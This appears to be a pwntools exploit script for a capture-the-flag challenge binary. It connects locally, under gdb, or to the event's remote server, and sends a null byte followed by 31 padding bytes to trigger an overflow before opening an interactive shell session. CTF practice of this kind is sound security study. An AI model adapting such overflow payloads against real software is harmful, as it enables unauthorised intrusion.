#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("uectf.uec.tokyo", 9001)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+140
		b *main+159
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b"\00"
payload += b'A' * ((8 * 4) - 1)

p.recvuntil(">")
p.send(payload)

p.interactive()
